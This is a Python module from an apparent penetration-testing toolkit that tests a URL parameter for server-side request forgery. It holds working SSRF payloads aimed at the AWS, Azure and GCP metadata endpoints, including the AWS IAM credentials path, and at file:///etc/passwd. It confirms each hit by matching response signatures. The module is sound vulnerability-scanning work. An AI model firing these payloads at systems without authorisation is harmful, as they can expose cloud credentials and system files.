"""
modules/vuln_scan/ssrf_tester.py — Server-Side Request Forgery (SSRF) tester.

Probes a parameter with internal-only resource URLs (cloud metadata
services, loopback) and confirms findings **only on strong content
signatures that the probe never sends** (e.g. ``ami-id``, ``vmId``) — a
server that merely reflects the injected URL back never matches, so
reflection-based false positives are impossible.

No third-party callback services are used: detection is purely response-
based, so nothing is sent to external services during the test.
"""

import logging
from urllib.parse import quote

from rich.progress import (
    BarColumn,
    MofNCompleteColumn,
    Progress,
    SpinnerColumn,
    TextColumn,
    TimeElapsedColumn,
)

from redkit.modules.base_module import BaseModule

logger = logging.getLogger(__name__)

# (probe_url, cloud, strong_signatures) — signatures never appear in our
# request, only in content the *server* fetched.
SSRF_PROBES: list[tuple[str, str, list[str]]] = [
    (
        "http://169.254.169.254/latest/meta-data/",
        "AWS EC2 metadata",
        ["ami-id", "instance-id", "iam/security-credentials", "reservation-id"],
    ),
    (
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "Azure IMDS",
        ["vmid", "subscriptionid", "resourcegroupname"],
    ),
    (
        "http://metadata.google.internal/computeMetadata/v1/",
        "GCP metadata",
        ["computemetadatav1", "metadata-flavor"],  # 403 body is distinctive
    ),
    (
        "file:///etc/passwd",
        "file:// wrapper",
        ["root:x:0:0", "root:*:0:0", "/bin/bash"],
    ),
]


class SsrfTester(BaseModule):
    """Test a query parameter for SSRF against cloud metadata and loopback.

    Response-based detection with signature strings absent from the request
    payload — reflection alone can never confirm a finding.
    """

    name = "SSRF Tester"
    description = "Tests a query parameter for SSRF against cloud metadata endpoints (response-based)."
    author = "K4os"
    category = "vuln_scan"

    options = {
        "target": {
            "value": None,
            "required": True,
            "description": "Target URL with a server-side fetch (e.g. https://example.com/fetch?url=).",
        },
        "param": {
            "value": None,
            "required": True,
            "description": "Query parameter holding the URL the server fetches (e.g. url, src, image).",
        },
        "timeout": {
            "value": 15,
            "required": False,
            "type": int,
            "description": "HTTP request timeout in seconds (default: 15).",
        },
    }

    def run(self) -> None:
        """Send SSRF probes and confirm via strong content signatures."""
        self.clear_findings()
        self.validate_options()

        target = self.get_option("target")
        param = self.get_option("param")
        http = self.http_client(target)

        confirmed: set[str] = set()

        # Baseline — must not contain any strong signature already.
        try:
            baseline_body = http.get(f"{target}?{param}=redkit-baseline-probe").text.lower()
        except Exception as exc:  # noqa: BLE001
            logger.warning("Baseline request failed — aborting SSRF test: %s", exc)
            return

        with Progress(
            SpinnerColumn(),
            TextColumn("[bold cyan]{task.description}"),
            BarColumn(),
            MofNCompleteColumn(),
            TimeElapsedColumn(),
            transient=False,
        ) as progress:
            task = progress.add_task(f"Testing SSRF on {target}", total=len(SSRF_PROBES))
            self._progress = progress

            for probe_url, cloud, signatures in SSRF_PROBES:
                progress.advance(task)
                if cloud in confirmed:
                    continue
                url = f"{target}?{param}={quote(probe_url, safe='%:/&?=')}"
                try:
                    resp = http.get(url)
                    body_lower = resp.text.lower()
                    matched = [s for s in signatures if s in body_lower and s not in baseline_body]
                    if matched and cloud not in confirmed:
                        confirmed.add(cloud)
                        logger.warning("SSRF confirmed (%s): signatures %s", cloud, matched)
                        self.add_finding(
                            finding_type="SSRF",
                            severity="CRITICAL",
                            title=f"SSRF confirmed — {cloud} reachable via '{param}'",
                            detail=(
                                f"The server fetched an internal-only resource through the "
                                f"'{param}' parameter and its content appeared in the response "
                                f"(signatures: {', '.join(matched[:3])}). Cloud metadata access "
                                f"frequently yields instance credentials — treat as critical."
                            ),
                            evidence=(
                                f"GET {url}\nProbe: {probe_url}\n"
                                f"Matched signatures: {', '.join(matched)}\n"
                                f"Response snippet: {resp.text[:300]}"
                            ),
                            # CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N (metadata credential theft)
                            cvss=9.8,
                        )
                except Exception as exc:  # noqa: BLE001 — keep scanning remaining probes
                    logger.debug("Request error for SSRF probe '%s': %s", probe_url, exc)

        total = len(self.get_findings())
        logger.info("SSRF testing complete: %d finding(s).", total)
